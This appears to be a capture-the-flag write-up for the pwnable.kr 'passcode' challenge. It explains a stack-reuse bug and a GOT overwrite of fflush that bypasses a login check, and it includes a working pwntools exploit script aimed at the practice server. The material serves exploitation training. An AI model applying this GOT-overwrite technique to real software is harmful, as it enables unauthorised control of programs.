### Analysis

The program has a vulnerability due to the reuse of stack memory between the `welcome` and `login` functions. The `login` function uses uninitialized variables (`passcode1` and `passcode2`), which can be influenced by the input provided in the `welcome` function. By carefully crafting the input, we can overwrite the `fflush` GOT entry to redirect execution and bypass the login check.

```C
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;
        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```
### Exploit

1. **Stack Memory Reuse**:
   - The `welcome` function writes 100 bytes of input into `name`, but the last 4 bytes of the stack are not overwritten.
   - These 4 bytes are reused in the `login` function as `passcode1`.

2. **Overwrite `fflush` GOT**:
   - The address of `fflush` in the GOT is `0x804a004`.
   - By overwriting `passcode1` with the address of `fflush`, we can control where `scanf` writes its input.

3. **Redirect Execution**:
   - When `scanf("%d", passcode1)` is called, it will write the input to the address stored in `passcode1` (which we set to the address of `fflush`).
   - We provide the address of the instruction after the login check (`0x80485d7`) as the input, effectively bypassing the login check.

### Solution Code

```python
from pwn import *

# Open a remote SSH connection
sh = ssh(host='pwnable.kr', user='passcode', port=2222, password='guest')
# Launch a process on the SSH connection
s = sh.process('./passcode')

# Address of fflush in GOT (which we want to overwrite)
fflush_address = p32(0x804a004)

# Craft the input: 96 bytes of 'a' followed by the address of fflush
input = b'a' * 96 + fflush_address

# Send the input
s.sendline(input)

# Receive the output
print(s.recvline())

# Address of the instruction after the login check (0x80485d7)
response = str(0x80485d7)

# Send the response to overwrite fflush GOT entry
s.sendline(response)

# Receive the output, which contains the flag!
for _ in range(4):
    print(s.recvline())

# Close the connection
s.close()
```

### Final Command

Run the following Python script to exploit the program and retrieve the flag:

```bash
python3 passcode_exploit.py
```
